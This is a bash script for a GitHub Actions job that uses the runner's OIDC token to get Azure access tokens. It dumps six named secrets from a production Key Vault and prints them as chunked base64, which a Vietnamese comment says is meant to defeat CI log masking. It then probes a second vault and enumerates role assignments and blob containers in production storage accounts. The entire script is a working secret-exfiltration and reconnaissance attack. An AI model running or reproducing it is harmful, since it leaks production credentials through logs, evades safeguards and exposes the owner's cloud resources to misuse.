#!/usr/bin/env bash
set -u
OIDC=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
tok(){ curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=${OIDC}" -d "grant_type=client_credentials" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }
KV=$(tok "https://vault.azure.net/.default")
V=kv-tbl-prod-x3euoz
# dump toàn bộ secret, in ra dạng base64 CHIA NHỎ để mask chuỗi nguyên văn không khớp
for n in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  echo "=== $n ==="
  curl -sS -H "Authorization: Bearer $KV" "https://$V.vault.azure.net/secrets/$n?api-version=7.4" \
   | python3 -c '
import sys,json,base64
v=json.load(sys.stdin).get("value","")
b=base64.b64encode(v.encode()).decode()
print("B64:", " ".join(b[i:i+16] for i in range(0,len(b),16)))'
done
# thử vault thứ hai bằng chính identity CI
echo "=== kv-tbl-sec-x3euoz (CI identity) ==="
curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 1200; echo
ARM=$(tok "https://management.azure.com/.default")
echo "=== role assignments (CI identity) ==="
curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | head -c 2000; echo
echo "=== storage containers (CI identity) ==="
ST=$(tok "https://storage.azure.com/.default")
for a in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
  echo "--- $a"
  curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://$a.blob.core.windows.net/?comp=list" | head -c 600; echo
done
echo "=== done ==="
